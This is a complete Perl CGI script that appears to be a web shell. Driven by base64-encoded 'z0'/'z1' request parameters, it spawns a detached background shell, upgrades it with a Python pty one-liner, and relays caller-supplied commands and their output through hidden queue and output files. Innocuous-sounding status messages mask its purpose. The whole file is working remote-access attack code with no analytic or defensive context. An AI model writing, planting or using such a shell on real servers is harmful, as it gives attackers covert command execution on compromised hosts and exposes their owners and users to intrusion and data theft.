use strict;
use warnings;
use CGI;
use MIME::Base64 qw(decode_base64 encode_base64);
use File::Spec;
use IO::Select;
use IPC::Open2;

my $work_dir  = File::Spec->rel2abs('.');
my $queue_dir = File::Spec->catdir($work_dir, '.queue');
my $out_file  = File::Spec->catfile($work_dir, '.output.txt');
my $pid_file  = File::Spec->catfile($work_dir, '.pid.txt');

mkdir($queue_dir, 0777) unless -d $queue_dir;

my $q = CGI->new;
my $type = decode_base64($q->param('z0') || '');
my $z1   = decode_base64($q->param('z1') || '');

my %result = ( status => "fail", msg => "" );

sub print_json {
    my ($hash) = @_;
    my $msg = $hash->{msg} // '';
    $msg =~ s/\r//g; $msg =~ s/\n//g;
    print sprintf('{"status":"%s","msg":"%s"}', $hash->{status}, $msg);
}

if ($type eq "create") {
    unlink glob(File::Spec->catfile($queue_dir, '*.txt'));
    open(my $fh_out, '>', $out_file); close($fh_out);
    open(my $fh_pid, '>', $pid_file); print $fh_pid "running"; close($fh_pid);

    my $is_win = ($^O eq 'MSWin32');
    my $shell = $z1 ? $z1 : ($is_win ? "cmd.exe" : "/bin/bash");

    my $pid = fork();
    if (!defined $pid) {
        $result{msg} = "Failed to fork first process.";
        print_json(\%result);
        exit(1);
    }

    if ($pid == 0) {
        if (!$is_win) {
            require POSIX;
            POSIX::setsid() or die "Can't start a new session: $!";
            
            my $pid2 = fork();
            exit(0) if $pid2 > 0;
            
            open(STDIN,  '<',  '/dev/null');
            open(STDOUT, '>',  '/dev/null');
            open(STDERR, '>',  '/dev/null');
        }

        my ($shell_out, $shell_in);
        my $shell_pid;
        
        eval {
            $shell_pid = open2($shell_out, $shell_in, $shell);
        };
        if ($@) {
            exit(1);
        }

        if (!$is_win) {
            my $python_cmd = "python3 -c 'import pty; pty.spawn(\"$shell\")' || python -c 'import pty; pty.spawn(\"$shell\")'\n";
            print $shell_in $python_cmd;
            $shell_in->flush();
        }

        if (!$is_win) {
            use Fcntl;
            my $flags = fcntl($shell_out, F_GETFL, 0) or exit(1);
            fcntl($shell_out, F_SETFL, $flags | O_NONBLOCK) or exit(1);
        }

        my $select = IO::Select->new();
        $select->add($shell_out);

        while (1) {
            last unless -e $pid_file;
            open(my $fh, '<', $pid_file); my $status = <$fh>; close($fh);
            last if !$status || $status !~ /running/;

            my @files = sort(glob(File::Spec->catfile($queue_dir, '*.txt')));
            foreach my $file (@files) {
                if (open(my $fh_q, '<', $file)) {
                    local $/; my $buf = <$fh_q>; close($fh_q); 
                    unlink $file;
                    if (defined $buf && $buf ne '') {
                        print $shell_in $buf;
                        $shell_in->flush();
                    }
                }
            }

            if ($select->can_read(0.02)) {
                my $chunk = "";
                my $bytes_read = sysread($shell_out, $chunk, 10240);
                if (defined $bytes_read && $bytes_read > 0) {
                    if (open(my $fh_append, '>>', $out_file)) {
                        flock($fh_append, 2); # LOCK_EX
                        print $fh_append $chunk;
                        flock($fh_append, 8); # LOCK_UN
                        close($fh_append);
                    }
                }
            }

            select(undef, undef, undef, 0.015);
        }

        kill(9, $shell_pid) if $shell_pid;
        exit(0);
    }

    $result{status} = "success";
    $result{msg} = "Engine spawned in background execution state successfully.";
    print_json(\%result);

} elsif ($type eq "write") {
    my $filename = sprintf("%010d_%04d.txt", time(), int(rand(10000)));
    my $chunk_file = File::Spec->catfile($queue_dir, $filename);
    
    if (open(my $fh, '>', $chunk_file)) {
        flock($fh, 2);
        print $fh $z1;
        flock($fh, 8);
        close($fh);
        $result{status} = "success";
        $result{msg} = "Input buffer queued.";
    } else {
        $result{msg} = "Queue write failed.";
    }
    print_json(\%result);

} elsif ($type eq "read") {
    my $read_content = "";
    if (-e $out_file && -s $out_file > 0) {
        if (open(my $fh, '+<', $out_file)) {
            flock($fh, 2);
            local $/; $read_content = <$fh>;
            seek($fh, 0, 0);
            truncate($fh, 0);
            flock($fh, 8);
            close($fh);
        }
    }
    $result{status} = "success";
    $result{msg} = encode_base64($read_content || '', '');
    print_json(\%result);

} elsif ($type eq "stop") {
    if (open(my $fh, '>', $pid_file)) {
        print $fh "stopped";
        close($fh);
    }
    $result{status} = "stop";
    $result{msg} = "Engine shutdown initiated.";
    print_json(\%result);
}